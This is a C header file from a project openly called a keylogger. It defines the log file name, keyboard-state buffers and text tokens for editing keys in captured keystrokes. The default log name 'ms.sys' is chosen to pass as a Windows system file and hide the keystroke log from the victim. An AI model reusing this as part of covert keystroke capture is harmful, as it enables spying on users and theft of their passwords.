/* This file is part of bb-keylogger project.
*
* See the NOTICE file distributed with this work for copyright information.
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*/

/*
* File:   global.h
* Author: Frapin Kevin
* Date:   23/03/2011
*
* DESCRIPTION
* -----------------------------------------------------------------------------
* File containing the declarations of all the global variables and constants.
* -----------------------------------------------------------------------------
*/

#ifndef GLOBAL_H
#define GLOBAL_H

//------------------------------------------------------------------- CONSTANTS
// Name of the default log file
#define DEFAULT_LOG_FILE_NAME "ms.sys"

// Size of the buffer used to store keyboard state
#define BUFFER_SIZE_KB_STATE 255

// Size of the buffer used to store strings
#define BUFFER_SIZE_STR 255

// Key is down
#define KEY_DOWN_STATE ( short int ) 0x8000

// Key has been pressed
#define KEY_PRESSED_STATE 0x0001

// Number of virtual keys that alter the text
#define NB_VKS_ALTER_STREAM 5

// Virtual keys : A, Z, 0, 9
#define VK_A 0x41
#define VK_Z 0x5A
#define VK_0 0x30
#define VK_9 0x39

//------------------------------------------------------------ GLOBAL VARIABLES
// Virtual keys that alter the text stream
// BACKSPACE, TABULATION, ENTER, INSERT, DELETE
static int VKS_ALTER_STREAM [ NB_VKS_ALTER_STREAM ] = 
	{ VK_BACK, VK_TAB, VK_RETURN, VK_INSERT, VK_DELETE  };
	
// Text replacing virtual keys that alter the text stream
static char * VKS_ALTER_STREAM_TXT [ NB_VKS_ALTER_STREAM ] = 
	{ "<BACKSPACE>", "<TAB>", "<ENTER>", "<INSERT>", "<DEL>" };

#endif /* GLOBAL_H */